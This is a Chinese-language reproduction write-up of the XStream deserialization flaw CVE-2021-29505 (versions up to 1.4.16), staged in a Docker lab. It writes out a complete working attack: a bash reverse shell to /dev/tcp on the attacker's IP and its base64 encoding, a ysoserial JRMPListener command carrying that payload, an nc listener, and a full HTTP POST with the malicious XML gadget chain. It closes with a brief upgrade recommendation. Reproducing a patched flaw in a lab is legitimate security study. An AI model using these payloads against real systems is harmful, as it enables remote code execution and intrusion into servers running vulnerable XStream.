## 0x00 简介

XStream是一个常用的Java对象和XML相互转换的工具，是用来处理XML文件序列化的框架，在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，大大简化了XML序列化工作。

## 0x01 漏洞概述

XStream官方发布安全更新，修复了多个XStream
反序列化漏洞，其中就包含了CVE-2021-29505。攻击者通过构造恶意的XML文档，可绕过XStream的黑名单，触发反序列化，从而造成CVE-2021-29505反序列化代码执行漏洞等。漏洞复杂度低，危害程度高，实际漏洞利用依赖于具体代码实现以及相关接口请求，无法批量远程利用。

## 0x02 影响版本

    
    
    XStream <= 1.4.16

## 0x03 环境搭建

1.安装虚拟机应用程序（本次测试使用的是VMware Workstation Pro16.1版本）

2.安装受漏洞影响的版本的Windows系统，本次测试使用的操作系统环境如下：

    
    
    Linuxshitday4.15.0-142-generic#146~16.04.1-Ubuntu SMP Tue Apr 13 09:27:15 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

以上软件获取和安装可自行上网搜索相关教程

3.使用docker搜索和下载镜像

    
    
    sudodocker search xstream  
    sudodocker pull vulfocus/xstream-cve_2021_29505

![image-20210726174612119](https://image.3001.net/images/20210729/1627530881_61022681b9fc0fdb0b3f9.png!small)

查看已有docker镜像

    
    
    sudodocker images

![image-20210726182134429](https://image.3001.net/images/20210729/1627530883_610226836172cd63b9d8c.png!small)

## 0x04 漏洞复现

1.启动docker镜像

    
    
    sudodocker run -p8080:8080 -t-dxstream-cve_2021_29505

![image-20210726184501907](https://image.3001.net/images/20210729/1627530884_61022684ca2d666d59141.png!small)

2.分别查看靶机IP为 192.168.50.129，攻击机IP为192.168.50.130

3.访问 xstream 服务

![image-20210726184759901](https://image.3001.net/images/20210729/1627530886_6102268633ba331f958ee.png!small)

出现如上页面则环境启动成功

4.下载反序列化工具

    
    
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

5.根据自己的攻击机IP和自定义端口修改以下反弹shell的语句

    
    
    /bin/bash -i>& /dev/tcp/192.168.50.130/4444 0>&1

6.对上一条语句进行base64编码

    
    
    importbase64  
    base64.b64encode(b"/bin/bash -i >& /dev/tcp/192.168.50.130/4444 0>&1")

![image-20210726231832560](https://image.3001.net/images/20210729/1627530887_6102268719aaf9858f372.png!small)

7.攻击机执行以下语句来监听端口

    
    
    java -cpysoserial.jar ysoserial.exploit.JRMPListener 4444CommonsCollections6 "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTAuMTMwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"

8.另起一个命令行进行反弹回来的shell的监听

    
    
    nc-lvp5555

9.打开BurpSuite，根据自己攻击机IP和端口进行修改后，使用以下payload对靶机进行发包

    
    
    POST / HTTP/1.1  
    Host: 192.168.50.129:8080  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Connection: keep-alive  
    Upgrade-Insecure-Requests: 1  
    Content-Type: application/xml  
    Content-Length: 1675  
    ​  
    <java.util.PriorityQueue serialization='custom'> <unserializable-parents/> <java.util.PriorityQueue> <default> <size>2</size> </default> <int>3</int> <javax.naming.ldap.Rdn_-RdnEntry> <type>12345</type> <value class='com.sun.org.apache.xpath.internal.objects.XString'> <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj> </value> </javax.naming.ldap.Rdn_-RdnEntry> <javax.naming.ldap.Rdn_-RdnEntry> <type>12345</type> <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'> <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'> <parsedMessage>true</parsedMessage> <soapVersion>SOAP_11</soapVersion> <bodyParts/> <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'> <attachmentsInitialized>false</attachmentsInitialized> <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'> <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'> <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'> <names> <string>aa</string> <string>aa</string> </names> <ctx> <environment/> <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'> <java.rmi.server.RemoteObject> <string>UnicastRef</string> <string>192.168.50.130</string> <int>4444</int> <long>0</long> <int>0</int> <long>0</long> <short>0</short> <boolean>false</boolean> </java.rmi.server.RemoteObject> </registry> <host>192.168.50.130</host> <port>4444</port> </ctx> </candidates> </aliases> </nullIter> </sm> </message> </value> </javax.naming.ldap.Rdn_-RdnEntry> </java.util.PriorityQueue> </java.util.PriorityQueue>

![image-20210726224101796](https://image.3001.net/images/20210729/1627530888_610226886c0897dbee349.png!small)

10.BP发包后可以看到成功反弹一个shell，可以判断是靶机上开启的容器的shell，可以执行任意命令

![image-20210726221049457](https://image.3001.net/images/20210729/1627530890_6102268a69cd5bc6c2ff3.png!small)

## 0x05 修复建议

升级xstream到1.4.17或以上版本

